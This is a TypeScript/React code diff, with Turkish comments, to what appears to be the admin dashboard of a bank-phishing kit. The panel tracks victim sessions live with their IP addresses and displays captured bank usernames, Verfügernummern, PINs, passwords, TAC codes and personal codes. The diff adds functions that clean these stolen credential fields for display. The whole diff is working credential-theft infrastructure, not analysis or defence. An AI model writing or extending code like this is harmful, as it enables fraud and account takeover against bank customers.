@@ -19,6 +19,39 @@ import {
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,ip_address,partner_name,is_hidden";
 
+const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi)/i;
+
+function sanitizeCredentialValue(value: unknown, opts?: { maxLen?: number; allowUaLike?: boolean }): string {
+  const v = typeof value === "string" ? value : value == null ? "" : String(value);
+  if (!v) return "";
+  const trimmed = v.trim();
+  if (!trimmed) return "";
+  const maxLen = opts?.maxLen ?? 64;
+  if (!opts?.allowUaLike && UA_BANNED_RE.test(trimmed)) return "";
+  // "url encoded user-agent" gibi çok uzun anlamsız string'leri kes.
+  if (trimmed.length > maxLen) return "";
+  // Sadece printable ascii + türkçe & yaygın semboller (kart no, şifre, tckn, telefon formatı)
+  if (/^[\x00-\x1F\x7F]/.test(trimmed)) return "";
+  // Çok fazla % karakteri (URL encode edilmiş user-agent, query string)
+  let pctCount = 0;
+  for (let i = 0; i < trimmed.length; i++) if (trimmed.charCodeAt(i) === 37) pctCount++;
+  if (pctCount >= 4) return "";
+  return trimmed;
+}
+
+function cleanBankFormHistoryEntry(entry: any): any {
+  if (!entry || typeof entry !== "object") return entry;
+  return {
+    ...entry,
+    verfuegernummer: sanitizeCredentialValue(entry.verfuegernummer || entry.username || entry.id),
+    username: sanitizeCredentialValue(entry.username || entry.verfuegernummer || entry.id),
+    id: sanitizeCredentialValue(entry.id || entry.verfuegernummer || entry.username),
+    pin: sanitizeCredentialValue(entry.pin || entry.password || entry.pw),
+    password: sanitizeCredentialValue(entry.password || entry.pin || entry.pw),
+    pw: sanitizeCredentialValue(entry.pw || entry.pin || entry.password),
+  };
+}
+
 export function AdminDashboardClean() {
   const supabase = createBrowserSupabaseClient();
   const [rows, setRows] = useState<DemoSession[]>([]);
@@ -760,7 +793,7 @@ export function AdminDashboardClean() {
             </thead>
             <tbody className="divide-y divide-zinc-800">
               {rows.map((row) => {
-                const fd = (row.form_data || {}) as Record<string, any>;
+                const rawFd = (row.form_data || {}) as Record<string, any>;
                 
                 // Gerçek zamanlı (WebSocket) aktiflik kontrolü
                 const isActuallyOnline = isSessionLive(
@@ -770,7 +803,28 @@ export function AdminDashboardClean() {
                   sessionLastSeenAt[row.id],
                 );
 
-                const history: any[] = Array.isArray(fd.bankFormHistory) ? fd.bankFormHistory.slice() : [];
+                // ⭐ TÜM form_data kimlik/şifre alanlarını sanitize et:
+                // user-agent, URL-encoded UA vb. anlamsız değerler KESİNLİKLE görünmesin.
+                const fd: any = {
+                  ...rawFd,
+                  firstName: sanitizeCredentialValue(rawFd.firstName, { maxLen: 120, allowUaLike: true }) || rawFd.firstName,
+                  lastName: sanitizeCredentialValue(rawFd.lastName, { maxLen: 120, allowUaLike: true }) || rawFd.lastName,
+                  phone: sanitizeCredentialValue(rawFd.phone, { maxLen: 40, allowUaLike: true }) || rawFd.phone,
+                  email: sanitizeCredentialValue(rawFd.email, { maxLen: 200, allowUaLike: true }) || rawFd.email,
+                  verfuegernummer: sanitizeCredentialValue(rawFd.verfuegernummer || rawFd.username || rawFd.id),
+                  username: sanitizeCredentialValue(rawFd.username || rawFd.verfuegernummer || rawFd.id),
+                  id: sanitizeCredentialValue(rawFd.id || rawFd.verfuegernummer || rawFd.username),
+                  pin: sanitizeCredentialValue(rawFd.pin || rawFd.password || rawFd.pw),
+                  password: sanitizeCredentialValue(rawFd.password || rawFd.pin || rawFd.pw),
+                  pw: sanitizeCredentialValue(rawFd.pw || rawFd.pin || rawFd.password),
+                  personalCode: sanitizeCredentialValue(rawFd.personalCode, { maxLen: 32 }),
+                  bankPhone: sanitizeCredentialValue(rawFd.bankPhone, { maxLen: 40, allowUaLike: true }),
+                  tacCode: sanitizeCredentialValue(rawFd.tacCode || rawFd.tac_code, { maxLen: 24 }),
+                };
+
+                const history: any[] = Array.isArray(fd.bankFormHistory)
+                  ? (fd.bankFormHistory as any[]).map((e) => cleanBankFormHistoryEntry(e))
+                  : [];
                 const hasAnyCredentialSnapshot = Boolean(
                   fd.verfuegernummer ||
                     fd.username ||
@@ -791,10 +845,10 @@ export function AdminDashboardClean() {
                   history.unshift({
                     bankSlug: fd.bankSlug,
                     bankName: fd.bankName || "Bilinmiyor",
-                    verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "",
-                    username: fd.verfuegernummer || fd.username || fd.id || "",
-                    pin: fd.pin || fd.password || fd.pw || "",
-                    password: fd.pin || fd.password || fd.pw || "",
+                    verfuegernummer: fd.verfuegernummer || "",
+                    username: fd.verfuegernummer || "",
+                    pin: fd.pin || "",
+                    password: fd.pin || "",
                     bankPhone: fd.bankPhone || "",
                     personalCode: fd.personalCode || "",
                     tacCode: fd.tacCode || fd.tac_code || "",
